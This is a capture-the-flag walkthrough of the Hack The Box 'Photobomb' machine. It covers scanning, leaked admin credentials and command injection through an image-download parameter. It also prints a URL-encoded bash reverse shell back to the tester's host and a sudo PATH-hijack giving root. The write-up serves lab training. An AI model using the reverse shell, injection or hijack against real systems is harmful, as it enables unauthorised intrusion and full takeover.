---
title: Writeup Photobomb HTB
author: lazy29t
date: 2023-02-02 22:10:00 +0800
categories: [HackTheBox, EASY]
tags: [pentesting, linux, exploit, revshell, proxy, PathHijack]
permalink: /HackTheBox/EASY/photobomb
render_with_liquid: false
pin: true
math: true
mermaid: true

---

![HTB Img](/assets/img//HTB/EASY/pwn.png){: width="700" height="1200" }

## Recognizement

Before to start we have to view if the machine is active throutgh **ICMP** ping.

```console
 $ ping -c 1 10.10.11.182
 --------
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 181.901/181.901/181.901/0.000 ms
---------
```

### Nmap

Now we are started to scan the IP machine with [**nmap**] with this commands.

```console
$ nmap -p- --open -sCV --min-rate 5000 -v -n -Pn 10.10.11.182 
```
And this is the output:
```console
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
How we can see the `port 80` is open so we are going to the domain [**https://photobomb.htb**](http://photobomb.htb) and see the content

![HTB Img](/assets/img//HTB/EASY/panel.png)

---

### Enumeration

Seeying the web-page index we have to click on `click here!` and it'll appear that credentials panel

![HTB Img](/assets/img//HTB/EASY/admin-psw.png)

So researched on the page on **Networks** tools, the pages tries to load a file called `photobomb.js`, so going to that file
![HTB Img](/assets/img//HTB/EASY/network.png)

And we can see the following information:

![HTB Img](/assets/img//HTB/EASY/information-diclosed.png)

We see a some information diclosed like **username:** `pH0t0` and **password:** `b0mb!`.
With that credentials are we can trying to write it on credentials panel

![HTB Img](/assets/img//HTB/EASY/admin-main.png)

Soo.. we are admin **('-')**

---

## Exploit

In that step we are using a proxy tool called [**Burpsuite**] and let's start to test.

### Proxy
So in this panel tell us that we are unable to download any picture from this page, well with the help our proxy we can see what request leave it us:

we can see that the package is processed by the POST method, and under headers we see some parameters of the request to download the image like: `photo`, `filetype` and `dimensions` but in this case we are focus on `filetype` parameter

![HTB Img](/assets/img//HTB/EASY/request.png)

Send it to repeater tool we are going to change any variable from `filetype` parameter look some effect:

![HTB Img](/assets/img//HTB/EASY/repeater.png)

### Reverse Shell

Verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on this parameter we are put to next to `jpg` adding `;` and write the next reverse shell code *(PD: encoded on url because we'll have an error from the syntaxis due for the commas)* on my case I'll use from *bash* method with **Netcat** listener

```console
$ bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
```
> You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) if you want :D.
{: .prompt-tip }

Now we are listening from our terminal with netcat see any response

```console
$ nc -lvnp 4040

Listening on [any] 4040 ...
---
wizard@photobomb:~/photobomb$ whoami
whoami
wizard
```
Now we are verify if we aren't on a virtual container:

```console
$ wizard@photobomb:~/photobomb$ hostname -I
hostname -I
10.10.11.182 dead:beef::250:56ff:feb9:d10e
wizard@photobomb:~/photobomb$
```
How you can see we are not so, we are on a good way.
So research from this user `wizard` in */home/wizard* directory with command `ls `you can see this:

```console
wizard@photobomb:~$ ls
photobomb user.txt
```
And we got the user flag **~(vov)~** 

```console
wizard@photobomb:~$ cat user.txt
8BN*************
```
---

## Privileges Escalation

And now we are going to start to privileges escalation
First writting `sudo -l` we see what user's group we are:

```console
wizard@photobomb:~$ sudo -l
Matching Default entries for wizard on photobomb:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/snap/bin
  
User wizard may run the following commands on photobomb:
  (root) SETENV: NONPASSWD: /opt/cleanup.sh
wizard@photobomb:~$
```
So how looked that the user wizard *(us)* should to run a script bash file called `cleanup.sh` that will allow us to manipulate the enviroment's variables with the following script:

```console
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log.photobomb > log/photobomb.old
  /usr/bin/trucate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```
{: file="opt/cleanup.sh" }

### $PATH Hijacking
Well let's start to hijack some variables like `find` from `/tmp/` directory

```console
wizard@photobomb:~/tmp$ touch find
wizard@photobomb:~/tmp$ chmod +x find    #give it execution permissions
wizard@photobomb:~/tmp$ nano find        # writting from this variable
```
> `find` is a variable binary in bash located `/usr/bin/find` but in this case the script does not specify the absolute path of that variable, therefore we can take advantage of that to manipulate it by becoming as **root** {: .prompt-tip }

On variable `find` we write `bash` that when executing as **root** they give us a bash bin in the `$PATH` environment:

```console
bash
```
{: file="find" }

Now what we must do is bring all documentation from `/tmp/` directory to our `PATH` environment, since when executed as **root** it will launch us an bash

```console
wizard@photobomb:~/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

And we become **root**

```console
root@photobomb:~/home/wizard/photobomb$ whoami
root
root@photobomb:~/home/wizard/photobomb$ cd 
root@photobomb:~$ cat root/root.txt
W4r***********io
root@photobomb:~/

```
We got the **root** flag (T‿‿T')
